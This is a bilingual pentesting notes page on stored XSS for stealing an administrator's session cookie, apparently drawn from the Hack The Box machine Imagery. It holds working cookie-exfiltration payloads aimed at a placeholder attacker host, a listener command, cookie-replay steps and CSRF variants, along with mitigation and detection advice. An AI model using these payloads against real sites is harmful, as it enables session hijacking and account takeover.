---
topic: Stored XSS — stealing the administrator cookie
tags: [web, xss, cookies, admin-bot, imagery]
---

# Stored XSS — stealing the administrator cookie

[🌐 Español](stored-xss-admin-cookie.md) | **English**

## Concept

Stored XSS persists in the database and runs when someone else visits the page. If that someone is an administrator, the script can read their session cookie, send it to the attacker and allow impersonation. It is a classic chain when an admin panel reviews reports, comments or tickets.

## When it applies

- A field is stored and rendered without escaping (HTML, Markdown, attributes).
- An administrator reviews the content from the same origin.
- The session cookie is not `HttpOnly`, or sensitive actions are reachable via CSRF.
- On Imagery, the bug report `details` field rendered as HTML and the admin visited it.

## Procedure

1. Identify the stored field and check whether it is escaped.
2. Inject a payload that sends `document.cookie` to the attacker.
3. Wait for the bot/admin to visit the page.
4. Receive the cookie on the listener.
5. Replace the cookie in the browser and access the panel.

## Commands

```html
<script>new Image().src='http://<ATTACKER>/?c='+encodeURIComponent(document.cookie)</script>
```

```html
<img src=x onerror="fetch('http://<ATTACKER>/',{method:'POST',body:document.cookie})">
```

```bash
python3 -m http.server 80
```

In the browser: DevTools → Application → Cookies → replace the value and reload.

## Variants

- If `HttpOnly` is set, use the XSS to make authenticated requests (`fetch('/admin/...')`) and exfiltrate the response.
- Create an admin user or change the password via CSRF.
- Use the XSS to read CSRF tokens and automate actions.
- Store the payload in an SVG or a field rendered in the panel.

## Limitations

- `HttpOnly` prevents reading the cookie.
- `SameSite=Strict` may block cross-site requests.
- A strict CSP may block inline scripts.
- The admin may never visit the content or may use an isolated environment.

## Mitigation

- Escape output by context (HTML, attribute, JS, URL).
- Use `HttpOnly`, `Secure` and `SameSite` on session cookies.
- Implement CSP with nonces and no `unsafe-inline`.
- Sanitise HTML with an allowlist (DOMPurify) if formatting is allowed.
- Review content on an isolated domain.

## Detection

- `<script>`, `onerror`, `onload` or `javascript:` in user fields.
- Outbound requests from the admin browser to unexpected domains.
- Cookies used from different IPs or user-agents.
- Session changes right after visiting reported content.

## References

- [OWASP — Cross Site Scripting](https://owasp.org/www-community/attacks/xss/)
- [OWASP — XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [0xdf — Imagery](https://0xdf.gitlab.io/2025/02/08/htb-imagery.html)
- [Imagery writeup](../../machines/linux/imagery/README.en.md)
